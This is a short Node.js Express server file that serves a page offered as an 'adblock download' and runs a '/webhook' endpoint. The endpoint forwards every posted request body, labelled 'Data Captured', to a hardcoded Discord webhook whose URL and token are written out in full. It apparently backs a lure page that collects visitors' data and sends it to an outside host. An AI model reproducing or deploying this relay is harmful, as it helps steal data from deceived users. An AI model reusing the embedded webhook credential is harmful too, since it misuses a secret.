
const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 5000;
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb';

// Parse JSON bodies
app.use(express.json());

// Serve static files
app.use(express.static('.'));

// Serve the main HTML file at root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve the adblock download page (if someone accesses it directly)
app.get('/adblock-download', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Webhook proxy endpoint
app.post('/webhook', async (req, res) => {
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**Data Captured**\n\`\`\`json\n${JSON.stringify(req.body, null, 2)}\n\`\`\``
            })
        });
        
        if (response.ok) {
            res.status(200).json({ success: true });
        } else {
            res.status(500).json({ error: 'Webhook failed' });
        }
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Handle all JavaScript file requests
app.get('/*.js', (req, res) => {
    const fileName = req.params[0] + '.js';
    res.sendFile(path.join(__dirname, fileName), (err) => {
        if (err) {
            res.status(404).send('JavaScript file not found');
        }
    });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running at http://0.0.0.0:${PORT}`);
    console.log(`📁 Serving files from: ${__dirname}`);
    console.log(`🌐 Main page: http://0.0.0.0:${PORT}`);
});
